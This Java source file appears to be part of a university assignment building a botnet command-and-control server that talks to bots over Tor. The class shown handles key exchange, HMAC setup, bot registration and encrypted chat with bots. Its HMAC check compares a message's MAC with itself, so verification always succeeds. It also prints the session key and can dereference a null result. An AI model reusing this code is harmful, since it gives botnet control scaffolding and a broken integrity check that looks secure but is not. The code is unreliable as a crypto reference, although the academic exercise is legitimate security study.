/**
 *    Ασφάλεια Δικτύων Υπολογιστών & Τεχνολογίες Προστασίας της Ιδιωτικότητας
 *                                   Άσκηση 2
 * Δημιουργία ασφαλούς διαύλου διαχείρισης botnet (C&C) με αξιοποίηση Tor και 
 * χρήση πρωτοκόλλου διασφάλισης εμπιστευτικότητας και ακεραιότητας
 * 
 *                      Πέππας Κωνσταντίνος 321/2011134
 *                      Σωτηρέλης Χρήστος   321/2012182
 *                      Χαϊκάλης Νικόλαος   321/2012200
 * 
 */

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.Socket;
import java.security.InvalidKeyException;
import java.security.KeyPair;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.Mac;
import javax.crypto.SecretKey;
import javax.swing.JTextArea;

/**
 *
 * Class pou edrewnw tin epikoinwnia tou C&C me ta Bots (run & stop)
 * kathos k dimiourgia tou chat anametaksi tous.
 */

public class ChatWithBots extends Thread implements Serializable{
    private int port; //Port pou sindeete o C&C me ta Bots.
    private Socket socket;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean keepWalking = true;
    private Messages msgs = new Messages();
    private Chat chating = new Chat();
    private Bot_Properties CurBot = new Bot_Properties();
    private JTextArea Text;
    private boolean NewClient = false;
    private SecretKey secKey;
    private Mac mac;
    private MySSL myssl = new MySSL();

    //An thelei o admin tu C&C borei na allaksei to port me ta Bots.
    public ChatWithBots(Socket socket, int port, JTextArea Text) {
        this.socket = socket;
        this.port = port;
        this.Text = Text;
    }
    
    //Default Times gia to port me ta Bots:
    public ChatWithBots(Socket socket, JTextArea Text) {
        this.socket = socket;
        this.Text = Text;
    }

    
    /**
     * synchronized void run gia na trehei kathe fora pou bainei kapoio
     * neo bot sto server alla k se periptwsi pou bun polla mazi na synhronizei
     * ta nimata tus.
     */
    @Override
    public synchronized void run(){
        try {
            oos = new ObjectOutputStream(socket.getOutputStream());
            ois = new ObjectInputStream(socket.getInputStream()); 
            chating = new Chat(oos, ois, "Bot");
            ServerClientHandSHake();
            Chat_Thread.start();
            //chating.SendMessage(msgs.BotSendMeYourInfos());
        } catch (NullPointerException | IOException ex) {
            Stop_Connection();
        }     
    }
    
    private void ServerClientHandSHake(){
        try {
            MySSL myssl = new MySSL();
            
            byte[] ca = myssl.GetCABytes();//Pairnw ta bytes tis CA.
            oos.writeObject(ca);//Stelnw tin CA
            Text.append("Sending Certificate\nWaiting for Secret Key.\n");
            byte[] SecKeyBytes = (byte[]) ois.readObject();//pairnw to kripto sec key
            
            System.out.println("SecKeyBytes" + SecKeyBytes);
            KeyPair keypair = myssl.GetKeyPair();
            PrivateKey privKey = keypair.getPrivate();
            secKey = myssl.DecryptSecKey(SecKeyBytes, privKey);
            Text.append("SecKey is: " + secKey +"\n");
            
            //Create HMAC:
            mac = Mac.getInstance("HmacSHA256");
            mac.init(secKey);
            Text.append("HMAC is ready for use.\n");
        } catch (IOException | ClassNotFoundException | NoSuchAlgorithmException | InvalidKeyException ex) {
            Logger.getLogger(ChatWithBots.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    //HMAC Validation:
    private Object HMacValidationAndDecrypt(byte[] ciphertext){
        System.out.println("HMacValidationAndDecrypt 1");
        byte[] macBytes = mac.doFinal(ciphertext);
        if(MessageDigest.isEqual(macBytes, mac.doFinal(ciphertext))){
            //System.out.println("Encrypt MSG: " + ciphertext);
            Object readObj = myssl.DecryptWithSecKey(ciphertext, secKey);
            System.out.println("HMacValidationAndDecrypt: " + readObj.toString());

            return readObj;
        }
        
        System.out.println("HMacValidationAndDecrypt FAILED");
        return null;
    }  
    

    /**
     * Methodos pou tin xrisimopoiume gia na kleisume to connection me kapoio 
     * botaki. Gia na kleisume kapoio bot kanume anazitisi stin lista me parametro
     * to socket to socket stin sigkekrimeni periptwsi to xrisimopoiw kai ws ID.
     * Molis vrw to katallilo socket kleinw olo to connection me to sigkekrimeno bot.
     */
    public void Stop_Connection(){
        /**
         * ta catch ta afinw kena gt dn thelw na bainei ekei
         * otan kapoio Bot vgainei apotoma, etsi k alliws tha dw
         * pws vgike otan tha stilw etima gia na  checkarw an einai edw
         * i an vgei me normal logout tha me enimerwsi.
         */
        Object tmp = msgs.StopConnection().toString();
        byte[] msg = myssl.EncryptWithSecKey(tmp, secKey);
        chating.SendBytes(msg);
        keepWalking = false;
        Chat_Thread.interrupt();
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
        } catch (IOException ex) {
            
        }
        try {
            if(socket !=null) socket.close();
        } catch (IOException ex) {
            
        }
    }
    
    /**
     * Checkarume an to socket einai kleisto an einai kleisto epistefi true
     * ara to bot auto ehei aposindethei apo to server mas i ehei pesei.
     * An girisei false tote to bot sinehizei na einai syndedemeno k perimenei
     * entoles.
     */
    public boolean SocketIsClosed(){
        return socket.isClosed();
    }
    
    /**
     * Chat metaksi tou C&C k tou Bot.
     */
    private Thread Chat_Thread = new Thread(() -> {
        while(keepWalking == true){
            byte[] read = chating.ReadBytes();
            
            if(read != null){
                System.out.println("Bytes from client: " + read);
                Object readObj = HMacValidationAndDecrypt(read);
                if(!(readObj.equals(""))){
                    Text.append(msgs.SendAsBot()+ readObj.toString() + "\n");
                }
                //Stop to connection me ton C&C
                if (readObj.toString().equalsIgnoreCase(msgs.StopConnection())){
                    Object tmp = msgs.ByeBot().toString();
                    byte[] msg = myssl.EncryptWithSecKey(tmp, secKey);
                    chating.SendBytes(msg);
                    Text.append(msgs.SendAsServer() + msgs.ByeBot() +"\n");
                    tmp = msgs.StopConnection().toString();
                    msg = myssl.EncryptWithSecKey(tmp, secKey);
                    chating.SendBytes(msg);
                    Text.append(msgs.SendAsServer() + msgs.StopConnection() +"\n");
                    Stop_Connection();
                }
                else if (readObj instanceof Bot_Properties){
                    Bot_Properties bp = new Bot_Properties();
                    bp = (Bot_Properties) readObj;
                    bp.setSocket(socket);
                    bp.setOos(oos);
                    CurBot = bp;
                    NewClient = true;
                    Object tmp = msgs.WelcomeBot().toString();
                    byte[] msg = myssl.EncryptWithSecKey(tmp, secKey);
                    chating.SendBytes(msg);
                    Text.append(msgs.SendAsServer() + msgs.WelcomeBot() +"\n");

                }
            }
        }
    });  

    public boolean NewClientAdded(){
        return NewClient;
    }
    public boolean isKeepWalking() {
        return keepWalking;
    }

    public Bot_Properties getCurBot() {
        return CurBot;
    }    

    public void setSocket(Socket socket) {
        this.socket = socket;
    }

    public void setSecKey(SecretKey secKey) {
        this.secKey = secKey;
    }

    public SecretKey getSecKey() {
        return secKey;
    }    

}//End class
